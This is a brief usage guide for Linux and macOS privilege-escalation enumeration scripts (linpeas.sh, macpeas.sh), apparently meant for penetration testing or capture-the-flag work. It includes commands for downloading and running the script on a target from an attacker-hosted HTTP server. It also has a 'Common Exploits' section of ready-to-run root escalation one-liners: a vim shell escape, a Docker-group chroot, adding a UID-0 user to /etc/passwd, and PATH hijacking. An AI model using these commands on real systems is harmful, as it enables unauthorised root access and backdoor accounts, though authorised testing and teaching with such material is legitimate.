# Usage Guide

## Basic Usage

```bash
cd scripts
./linpeas.sh       # Linux
./macpeas.sh       # macOS
```

## Save Output

```bash
./linpeas.sh -o results.txt
./macpeas.sh -o ~/Desktop/enum.txt
```

## Transfer to Target

```bash
# Start HTTP server on your machine
python3 -m http.server 8000

# Download on target
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Common Exploits

**SUID vim/nano:**
```bash
vim -c ':!/bin/bash'
```

**Docker group:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Writable /etc/passwd:**
```bash
echo 'hacker:x:0:0::/root:/bin/bash' >> /etc/passwd
```

**PATH hijacking:**
```bash
# Create fake binary in writable PATH directory
echo '#!/bin/bash' > /writable/path/binary
echo '/bin/bash -p' >> /writable/path/binary
chmod +x /writable/path/binary
```

## Priority

1. Check CRITICAL findings first
2. Then HIGH-RISK
3. Then POTENTIAL
4. Use GTFOBins for SUID exploitation

## Resources

- GTFOBins: https://gtfobins.github.io/
- HackTricks: https://book.hacktricks.xyz/
- Exploit-DB: https://www.exploit-db.com/
